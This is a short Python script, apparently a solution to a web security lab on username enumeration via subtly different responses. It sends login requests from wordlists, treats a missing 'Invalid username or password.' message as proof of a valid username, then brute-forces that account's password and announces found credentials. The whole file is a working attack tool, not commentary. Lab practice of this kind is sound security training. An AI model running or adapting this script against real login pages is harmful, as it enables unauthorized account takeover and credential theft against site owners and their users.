# Created by sm6r,2024
# Lab: Username enumeration via subtly different responses
import requests
import sys

if len(sys.argv)!=2:
    print("Usage: solution.py LOGIN_URL")
    exit()


url = sys.argv[1]
usernames= open("usernames.txt","r").readlines()
passwords= open("passwords.txt","r").readlines()

response= requests.post(url,{'username':'xxxxxx','password':'xxxxxx'})
length=len(response.text)
flg=True

for user in usernames:
    user=user.strip()
    print(f"Username: {user}",end="  "*len(user)+"\r",flush=True)
    response= requests.post(url,{'username':user,'password':'xxxxxx'})
     

    if response.text.find("Gateway Timeout") !=-1:
            print("the URL isn't valid.... ")
            exit()

    if  response.text.find("Invalid username or password.") ==-1:
        print("\nFound the valid username, now bruteForcing the password ")

        for passs in passwords:
            passs=passs.strip()
            print(f"Password: {passs}",end=" "*len(passs)+"\r",flush=True)
            response= requests.post(url,{'username':user,'password':passs})


            if  response.text.find("Invalid username or password") ==-1:
                        print("\n\nFOUND VALID CREDENTIALS\nATTACK DONE SUCCEFFULLY")
                        flg=False
                        break

    if not flg:
        break


if flg:
    print("DIDNT FIND THE CORRECT CREDs ...")

            



